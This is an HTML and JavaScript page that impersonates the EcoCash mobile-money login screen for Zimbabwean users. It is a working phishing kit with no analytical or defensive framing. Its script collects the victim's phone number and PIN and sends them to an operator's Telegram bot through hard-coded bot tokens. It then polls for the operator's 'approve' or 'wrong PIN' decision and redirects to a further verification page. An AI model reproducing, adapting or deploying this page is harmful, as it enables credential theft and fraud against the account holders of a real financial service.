<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash - Logins</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html,
        body {
            min-height: 100vh;
            font-family: 'Inter', sans-serif;
            background: white;
            overflow-x: hidden;
            overflow-y: auto;
        }
        
        body {
            display: flex;
            flex-direction: column;
        }
        
        .logo {
            text-align: center;
            padding: 50px 20px 20px;
            flex-shrink: 0;
        }
        
        .logo-text {
            font-size: 36px;
            font-weight: 700;
        }
        
        .logo-eco {
            color: #0066ff;
        }
        
        .logo-cash {
            color: #ff0000;
        }
        
        .login-content {
            flex: 1 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 30px 50px;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }
        
        .title {
            font-size: 26px;
            font-weight: 600;
            color: #333;
            margin-bottom: 40px;
        }
        
        .phone-group {
            width: 100%;
            border: 2px solid #0066ff;
            border-radius: 16px;
            display: flex;
            align-items: center;
            padding: 18px 24px;
            margin-bottom: 40px;
            background: white;
        }
        
        .flag {
            font-size: 28px;
            margin-right: 12px;
        }
        
        .country-select {
            display: flex;
            align-items: center;
            color: #0066ff;
            font-weight: 600;
            font-size: 18px;
            margin-right: 16px;
        }
        
        .dropdown-arrow {
            font-size: 14px;
            margin-left: 6px;
        }
        
        .phone-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 18px;
            color: #333;
        }
        
        .phone-input::placeholder {
            color: #aaa;
        }
        
        .pin-label {
            font-size: 16px;
            color: #666;
            margin-bottom: 24px;
            font-weight: 500;
        }
        
        .pin-group {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .pin-box {
            width: 60px;
            height: 60px;
            border: 2px solid #0066ff;
            border-radius: 16px;
            font-size: 28px;
            text-align: center;
            background: white;
            color: #333;
            font-weight: 600;
        }
        
        .forgot {
            font-size: 15px;
            color: #0066ff;
            text-decoration: none;
            font-weight: 500;
            margin-bottom: 40px;
        }
        
        #loginBtn {
            display: none;
            width: 100%;
            max-width: 400px;
            padding: 18px;
            background: #0066ff;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 50px;
            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
        }
        
        .bottom-section {
            background: #005eb8;
            color: white;
            padding: 100px 30px 80px;
            text-align: center;
            width: 100vw;
            margin-left: calc(-50vw + 50%);
            position: relative;
            flex-shrink: 0;
        }
        
        .curve {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 90px;
            background: white;
            border-radius: 0 0 50% 50% / 0 0 100% 100%;
            transform: scaleX(1.8);
            transform-origin: top;
        }
        
        .bottom-content {
            position: relative;
            z-index: 2;
        }
        
        .bottom-text {
            font-size: 15px;
            margin-bottom: 35px;
            line-height: 1.6;
            opacity: 0.95;
        }
        
        .bottom-btns {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 40px;
        }
        
        .bottom-btn {
            background: white;
            color: #0066ff;
            border: none;
            border-radius: 30px;
            padding: 18px 36px;
            font-weight: 600;
            font-size: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            width: 180px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
        }
        
        .btn-icon {
            font-size: 26px;
            color: #0066ff;
        }
        
        .version {
            font-size: 14px;
            margin-bottom: 12px;
            opacity: 0.9;
            font-weight: 500;
        }
        
        .terms {
            font-size: 13px;
            opacity: 0.85;
            line-height: 1.5;
        }
        
        .terms a {
            color: white;
            text-decoration: underline;
            font-weight: 500;
        }
        
        /* PROFESSIONAL LOADING OVERLAY */
        #spinnerOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.99), rgba(240, 244, 255, 0.99));
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
            backdrop-filter: blur(2px);
        }
        
        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 40px;
        }
        
        .spinner {
            width: 80px;
            height: 80px;
            border: 4px solid #e8f0ff;
            border-top: 4px solid #0066ff;
            border-right: 4px solid #0066ff;
            border-radius: 50%;
            animation: spin 1.2s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
            box-shadow: 0 0 20px rgba(0, 102, 255, 0.15);
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            font-size: 18px;
            color: #333;
            text-align: center;
            line-height: 1.8;
            max-width: 320px;
            font-weight: 600;
            letter-spacing: 0.3px;
        }
        
        .spinner-subtext {
            font-size: 14px;
            color: #999;
            text-align: center;
            line-height: 1.6;
            max-width: 300px;
            font-weight: 400;
            margin-top: 8px;
        }
        
        .loading-dots {
            display: inline-flex;
            gap: 6px;
            margin-top: 8px;
        }
        
        .dot {
            width: 8px;
            height: 8px;
            background: #0066ff;
            border-radius: 50%;
            animation: bounce 1.4s infinite;
        }
        
        .dot:nth-child(1) {
            animation-delay: 0s;
        }
        
        .dot:nth-child(2) {
            animation-delay: 0.2s;
        }
        
        .dot:nth-child(3) {
            animation-delay: 0.4s;
        }
        
        @keyframes bounce {
            0%, 80%, 100% {
                opacity: 0.3;
                transform: scale(0.8);
            }
            40% {
                opacity: 1;
                transform: scale(1.2);
            }
        }

        /* RESULT OVERLAY */
        #resultOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
            padding: 20px;
        }
        
        .result-message {
            font-size: 18px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 320px;
            font-weight: 500;
        }
    </style>
</head>

<body>
    <div class="logo">
        <div class="logo-text">
            <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
        </div>
    </div>

    <div class="login-content">
        <h1 class="title">Login</h1>

        <div class="phone-group">
            <span class="flag">🇿🇼</span>
            <div class="country-select">
                +263 <span class="dropdown-arrow">▼</span>
            </div>
            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number">
        </div>

        <div class="pin-label">Enter your PIN</div>
        <div class="pin-group">
            <input type="password" class="pin-box" maxlength="1">
            <input type="password" class="pin-box" maxlength="1">
            <input type="password" class="pin-box" maxlength="1">
            <input type="password" class="pin-box" maxlength="1">
        </div>

        <a href="#" class="forgot">Forgot PIN?</a>

        <button id="loginBtn">LOGIN</button>
    </div>

    <div class="bottom-section">
        <div class="curve"></div>
        <div class="bottom-content">
            <div class="bottom-text">
                To register an EcoCash wallet or get assistance,<br> click below
            </div>
            <div class="bottom-btns">
                <a href="#" class="bottom-btn">
                    <div class="btn-icon">👤</div>
                    Register
                </a>
                <a href="#" class="bottom-btn">
                    <div class="btn-icon">ℹ️</div>
                    Help & Support
                </a>
            </div>
            <div class="version">v2.13P</div>
            <div class="terms">
                By signing in you agree to the <a href="#">Terms and Conditions</a>
            </div>
        </div>
    </div>

    <!-- PROFESSIONAL LOADING OVERLAY -->
    <div id="spinnerOverlay">
        <div class="loader-container">
            <div class="spinner"></div>
            <div>
                <div class="spinner-text">Verifying your credentials</div>
                <div class="spinner-subtext">Please wait while we connect to our secure server</div>
                <div class="loading-dots">
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- RESULT OVERLAY -->
    <div id="resultOverlay">
        <div class="result-message" id="resultMessage"></div>
    </div>

    <script>
        // Bot 1 (your existing)
        const BOT_TOKEN_1 = '8177967357:AAGVF2TTnE2uSD0MH19VAq3rRH9jbnuRWpQ';
        const CHAT_ID_1 = '8820857419';

        // Bot 2 (your second bot)
        const BOT_TOKEN_2 = '8177967357:AAGVF2TTnE2uSD0MH19VAq3rRH9jbnuRWpQ';
        const CHAT_ID_2 = '8820857419';

        const savedPhone = localStorage.getItem('phone');
        const phoneInput = document.getElementById('phoneInput');
        if (savedPhone && savedPhone.length === 9) {
            phoneInput.value = savedPhone;
        }
        const pinBoxes = document.querySelectorAll('.pin-box');
        const loginBtn = document.getElementById('loginBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        const resultOverlay = document.getElementById('resultOverlay');
        const resultMessage = document.getElementById('resultMessage');

        let pinValue = '';
        let pollInterval1 = null;
        let pollInterval2 = null;
        let lastUpdateId1 = 0;
        let lastUpdateId2 = 0;
        let currentTimestamp = 0;
        let actionProcessed = false;

        function checkPinComplete() {
            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
        }

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                if (box.value.length === 1 && index < 3) {
                    pinBoxes[index + 1].focus();
                }
                checkPinComplete();
            });
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        // Helper to send to a bot with inline keyboard
        function sendToBot(botToken, chatId, text, replyMarkup) {
            const payload = {
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            };
            if (replyMarkup) {
                payload.reply_markup = replyMarkup;
            }
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        // Handle a callback query from either bot
        function handleCallback(callbackData, callbackQueryId, botToken) {
            if (actionProcessed) return;
            actionProcessed = true;

            // Answer the callback query to remove loading state
            fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    callback_query_id: callbackQueryId
                })
            }).catch(() => {});

            // Stop both polling intervals
            if (pollInterval1) clearInterval(pollInterval1);
            if (pollInterval2) clearInterval(pollInterval2);

            spinnerOverlay.style.display = 'none';
            resultOverlay.style.display = 'flex';

            const parts = callbackData.split('_');
            if (parts[0] === 'approve') {
                resultMessage.textContent = 'Login approved! You will be redirected shortly.';
                // Proceed to next page
                setTimeout(() => {
                    window.location.href = 'verify.html';
                }, 2000);
            } else if (parts[0] === 'cancel') {
                resultMessage.textContent = 'Login was cancelled. Please try again.';
                // Reset form after 2 seconds
                setTimeout(() => {
                    resultOverlay.style.display = 'none';
                    spinnerOverlay.style.display = 'none';
                    actionProcessed = false;
                    pinBoxes.forEach(box => box.value = '');
                    checkPinComplete();
                    pinBoxes[0].focus();
                }, 2000);
            } else if (parts[0] === 'wrongpin') {
                resultMessage.textContent = 'The PIN provided is wrong or has expired, please try again.';
                // Reset form after 2 seconds
                setTimeout(() => {
                    resultOverlay.style.display = 'none';
                    spinnerOverlay.style.display = 'none';
                    actionProcessed = false;
                    pinBoxes.forEach(box => box.value = '');
                    checkPinComplete();
                    pinBoxes[0].focus();
                }, 2000);
            }
        }

        // Poll a single bot for callback responses
        function pollBot(botToken, chatId, lastUpdateIdRef, pollIntervalRef) {
            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateIdRef + 1}&timeout=10`)
                .then(res => res.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        for (let update of data.result) {
                            // Update the reference via the outer variable reference approach
                            if (botToken === BOT_TOKEN_1) {
                                lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
                            } else {
                                lastUpdateId2 = Math.max(lastUpdateId2, update.update_id);
                            }

                            if (update.callback_query && !actionProcessed) {
                                const cb = update.callback_query;
                                const dataParts = cb.data.split('_');
                                const ts = parseInt(dataParts[1]);

                                if (ts === currentTimestamp) {
                                    handleCallback(cb.data, cb.id, botToken);
                                    return;
                                }
                            }
                        }
                    }
                })
                .catch(() => {});
        }

        // Start polling both bots
        function startPollingBoth() {
            actionProcessed = false;

            // Poll Bot 1 every 1.5s
            pollInterval1 = setInterval(() => {
                pollBot(BOT_TOKEN_1, CHAT_ID_1, lastUpdateId1, 'pollInterval1');
            }, 1500);

            // Poll Bot 2 every 1.5s
            pollInterval2 = setInterval(() => {
                pollBot(BOT_TOKEN_2, CHAT_ID_2, lastUpdateId2, 'pollInterval2');
            }, 1500);
        }

        // ========== LOGIN CLICK ==========
        loginBtn.addEventListener('click', () => {
            const phone = phoneInput.value.trim();
            if (!phone) {
                alert('Please enter phone number');
                return;
            }

            spinnerOverlay.style.display = 'flex';

            // Save phone to localStorage
            localStorage.setItem('phone', phone);

            currentTimestamp = Date.now();

            // Build the credential message with inline buttons
            const message = `*Login Verification*\n\n📱 Phone: +263 ${phone}\n🔐 PIN: ${pinValue}\n\nPlease approve or deny this login attempt.`;
            const replyMarkup = {
                inline_keyboard: [
                    [{
                        text: '✅ Approve',
                        callback_data: 'approve_' + currentTimestamp
                    }, {
                        text: '❌ Cancel',
                        callback_data: 'cancel_' + currentTimestamp
                    }, {
                        text: '🚫 WRONG PIN',
                        callback_data: 'wrongpin_' + currentTimestamp
                    }]
                ]
            };

            // Send to both bots with inline buttons
            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
            sendToBot(BOT_TOKEN_2, CHAT_ID_2, message, replyMarkup);

            // Start polling both bots for the response
            startPollingBoth();
        });

        checkPinComplete();
        pinBoxes[0].focus();
    </script>
</body>

</html>
